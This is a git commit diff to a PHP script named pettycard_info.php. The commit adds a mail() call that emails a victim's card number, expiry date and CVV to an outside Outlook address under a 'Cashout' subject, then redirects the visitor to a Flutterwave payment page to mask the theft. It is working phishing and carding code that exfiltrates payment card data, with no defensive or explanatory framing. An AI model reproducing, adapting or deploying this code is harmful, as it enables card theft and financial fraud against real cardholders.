00a1605458e6a195cb95e41a294565eb99f281b4
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-11-03 18:19:00 +0100

    Update pettycard_info.php

--- pettycard_info.php
+++ pettycard_info.php
@@ -8,5 +8,6 @@ $to = "okeke158@outlook.com";
 $subject = "Cashout Is A Must By Gods  Grace";
 $message = 'CARD: ' . $card . $nl.'EXP: ' . $exp .$nl. 'CVV: ' . $cvv ;
 $headers = "From:" . $from;
+mail($to,$subject,$message, $headers) ;
 header('Location: https://flutterwave.com/pay/w3ef0pybjg3x?_gl=1%2a15dvi80%2a_ga%2aMTQwNDA0MTU0OS4xNjYwMzg4MDAx%2a_ga_KQ9NSEMFCF%2aMTY2NjEwNzM5NC41Ny4xLjE2NjYxMDc1MTguMzAuMC4w');
 ?>
